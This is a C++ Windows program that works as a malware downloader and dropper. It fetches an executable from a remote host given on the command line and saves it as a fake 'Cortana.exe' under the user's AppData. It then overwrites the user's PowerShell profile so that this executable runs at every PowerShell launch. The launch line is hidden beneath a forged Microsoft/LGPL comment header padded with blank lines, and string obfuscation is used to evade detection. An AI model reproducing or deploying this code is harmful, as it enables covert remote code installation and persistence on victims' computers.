#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <vector>
#include <shlwapi.h>
#include <winhttp.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(lib, "shlwapi")
#pragma comment(lib, "winhttp")



EXTERN_C NTSTATUS NtCreateFile(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
);

EXTERN_C NTSTATUS NtWriteFile(
    HANDLE           FileHandle,
    HANDLE           Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID            Buffer,
    ULONG            Length,
    PLARGE_INTEGER   ByteOffset,
    PULONG           Key
);

struct PE {

    LPVOID pPE;
    DWORD size;

};

char* EnVariable(char* variable) {
    char lpName[MAX_PATH];
    char lpBuffer[MAX_PATH];
    DWORD  nSize = MAX_PATH;
    if (!GetEnvironmentVariableA(variable, lpBuffer, nSize)) {
        printf("Failed in GetEnvironmentVariableA (%u)\n", GetLastError());
        return NULL;
    }

    return lpBuffer;
}

BOOL mkdir(const char* dirName) {

    if (PathFileExistsA(dirName)) {
        printf("[!] \"%s\" already exist\n", dirName);
        return TRUE;
    }


    BOOL successC = CreateDirectoryA(dirName, NULL);
    if (!successC) {
        return FALSE;
    }

    
    return TRUE;
}

BOOL Persiste(LPVOID ImageBase, DWORD ImageSize, const char* path) {

    NTSTATUS status1;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK osb;
    UNICODE_STRING fileName;
    HANDLE fHandle;

    // \\??\\C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Loader.exe


    char realPath[MAX_PATH];
    memset(realPath, '\0', MAX_PATH);
    lstrcatA(realPath, "\\??\\");
    lstrcatA(realPath, path);
    lstrcatA(realPath, "\\Cortana.exe");

    if (PathFileExistsA(realPath)) {
        printf("[!] \"%s\" already exist\n", realPath);
        return TRUE;
    }
    //printf("realPath : %s\n", realPath);

    const size_t cSize = strlen(realPath) + 1;
    wchar_t* wpath = new wchar_t[cSize];
    mbstowcs(wpath, realPath, cSize);



    RtlInitUnicodeString(&fileName, (PCWSTR)wpath);
    ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);


    status1 = NtCreateFile(&fHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, 0,
        FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status1)) {
        printf("[!] Failed in NtCreateFile (%u)\n", GetLastError());
        return FALSE;
    }

    NTSTATUS status2;

    status2 = NtWriteFile(fHandle, NULL, NULL, NULL, &osb, (PVOID)ImageBase, ImageSize, NULL, NULL);

    if (!NT_SUCCESS(status2)) {
        printf("[!] Failed in NtWriteFile (%u)\n", GetLastError());
        return FALSE;
    }

    NTSTATUS status3;
    OBJECT_ATTRIBUTES oa2;
    IO_STATUS_BLOCK osb2;
    UNICODE_STRING fileName2;
    HANDLE fHandle2;

    char PSpath[MAX_PATH];
    char HOMEPATH[] = { 'H','O','M','E','P','A','T','H',0 };
    memset(PSpath, '\0', MAX_PATH);
    lstrcatA(PSpath, "\\??\\C:");
    lstrcatA(PSpath, EnVariable(HOMEPATH));
    lstrcatA(PSpath, "\\Documents\\windowspowershell\\profile.ps1");
    //printf("PSpath = %s\n", PSpath);
    
    const size_t cSize2 = strlen(PSpath) + 1;
    wchar_t* wpath2 = new wchar_t[cSize2];
    mbstowcs(wpath2, PSpath, cSize2);



    RtlInitUnicodeString(&fileName2, (PCWSTR)wpath2);
    ZeroMemory(&osb2, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa2, &fileName2, OBJ_CASE_INSENSITIVE, NULL, NULL);

    char input[8112];
    memset(input, '\0', 8112);
    lstrcatA(input, "<#\n* Internal Powershell Script\n*\n*Copyright(C) Windows\n*\n"
        "*This library is free software; you can redistribute it and /or\n"
        "*modify it under the terms of the GNU Lesser General Public\n"
        "* License as published by the Free Software Foundation; either\n"
        "* version 2.1 of the License, or (at your option) any later version.\n"
        "*\n"
        "* This library is distributed in the hope that it will be useful,\n"
        "* but WITHOUT ANY WARRANTY; without even the implied warranty of\n"
        "* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the GNU\n"
        "* Lesser General Public License for more details.\n"
        "*\n"
        "* You should have received a copy of the GNU Lesser General Public\n"
        "* License along with this library; if not, write to the Free Software\n"
        "* Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110 - 1301, USA\n"
        "*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n"
        "*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n\*n*\n*\n*\n*\n*\n*\n*\n"
        "*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n"
        "*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n*\n"
        "#>\n");
    

    status3 = NtCreateFile(&fHandle2, FILE_GENERIC_WRITE, &oa2, &osb2, 0, FILE_ATTRIBUTE_NORMAL, 0,
        FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status3)) {
        printf("[!] Failed in NtCreateFile2 (%u)\n", GetLastError());
        return FALSE;
    }

    NTSTATUS status4;

    char realPath2[MAX_PATH];
    memset(realPath2, '\0', MAX_PATH);
    lstrcatA(realPath2, path);
    lstrcatA(realPath2, "\\Cortana.exe");

    lstrcatA(input, realPath2);
    //printf("realPath2 : %s\n", realPath2);

    status4 = NtWriteFile(fHandle2, NULL, NULL, NULL, &osb2, input, sizeof(input), NULL, NULL);

    if (!NT_SUCCESS(status4)) {
        printf("[!] Failed in NtWriteFile2 (%u)\n", GetLastError());
        return FALSE;
    }
    
    return TRUE;
}


PE GetPE(wchar_t* whost, DWORD port, wchar_t* wresource) {
    struct PE pe;
    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {

                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                }
                delete[] pszOutBuffer;

            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();
        //printf("size : %d\n", size);
        char* my_PE = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            my_PE[i] = PEbuf[i];
        }
        pe.pPE = my_PE;
        pe.size = size;
        return pe;
}

int main(int argc, char** argv) {

    // Validate the parameters
    if (argc != 4) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
        return 1;
    }
    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* resource = argv[3];

    const size_t cSize1 = strlen(host) + 1;
    wchar_t* whost = new wchar_t[cSize1];
    mbstowcs(whost, host, cSize1);


    const size_t cSize2 = strlen(resource) + 1;
    wchar_t* wresource = new wchar_t[cSize2];
    mbstowcs(wresource, resource, cSize2);

    PE pe = GetPE(whost, port, wresource);


    char path[MAX_PATH];
    char LOCALAPPDATA[] = { 'L','O','C','A','L','A','P','P','D','A','T','A',0 };
    memset(path, '\0', MAX_PATH);
    lstrcatA(path, EnVariable(LOCALAPPDATA));
    lstrcatA(path, "\\Microsoft\\Cortana");

    //printf("Path : %s\n", path);

    if (!mkdir(path)) {
        printf("Failed in making Cortana dir (%u)\n", GetLastError());
        return -1;
    }

    Persiste(pe.pPE, pe.size, path);

    return 0;

}



